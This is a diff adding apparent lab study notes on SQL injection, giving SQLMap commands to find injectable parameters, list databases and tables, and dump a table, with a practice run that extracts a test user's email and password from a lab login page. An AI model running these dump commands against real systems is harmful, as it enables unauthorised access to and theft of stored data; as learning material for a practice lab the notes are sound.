@@ -1,0 +1,76 @@
+=== SQL Injection Vulnerability
+when the input is improperly sanitized, attackers can manipulate the input and write SQL queries that would get executed in the database and perform attackets desired actions.
+
+
+=== Automated SQL Injection Tool
+SQLMap is an automated tool for detecting and exploiting SQL injection vulnerabities in web application. It simplifies the process of identifying these vulnerabilities
+
+
+--dbs -> flag helps to extract all the database names
+
+Once we know the database name, ew can extract information about the tables of the database using flat `-D <databaseName> --tables`
+
+Once we get the table names and we want to enumerate the record in those tables, we can use `-D <databaseName> -T <tableName> --dump`
+
+
+If you see any web application using GET parameters in the URL to retrieve data, you can test that URL with the `-u` flag in SQLMap tool. This is considered to be HTTP GET based testing. This approch is followed when the application uses GET parameters in the URL to retrieve data from the searches.
+
+
+
+=== Process
+-> Step 1
+check whether sql injection is possible or not
+cmd: sqlmap -u <url> 
+
+from the results of this command check whether sql injection is possible or not
+
+-> Step 2
+if sql injection is possible then proceed forward
+Get the db details (fetch the databases names and vital information)
+cmd: sqlmap -u <url> --dbs
+
+-> Step 3
+Once we get the databases, we need what tables that are present in the database
+cmd: sqlmap -u <url> -D <dbName> --tables
+
+-> Step 4
+Dump data within a table
+cmd: sqlmap -u <url> -D <dbName> -T <tableName> --dump
+
+
+sqlmap -u http://sqlmaptesting.thm/search/cat=1 -D members --tables
+
+
+===Practice
+1. sqlmap -u 'http://$IP/ai/includes/user_login?email=test&password=test' --dbs --level=5
+
+---
+available databases [6]:
+[*] ai
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] phpmyadmin
+[*] test
+---
+
+2. sqlmap -u 'url' -D ai --tables
+---
+Database: ai
+[1 table]
++------+
+| user |
++------+
+---
+
+3. sqlmap -u url --level=5 -D ai -T user --dump
+---
+Database: ai
+Table: user
+[1 entry]
++----+-----------------+---------------------+----------+
+| id | email           | created             | password |
++----+-----------------+---------------------+----------+
+| 1  | test@chatai.com | 2023-02-21 09:05:46 | 12345678 |
++----+-----------------+---------------------+----------+
+---
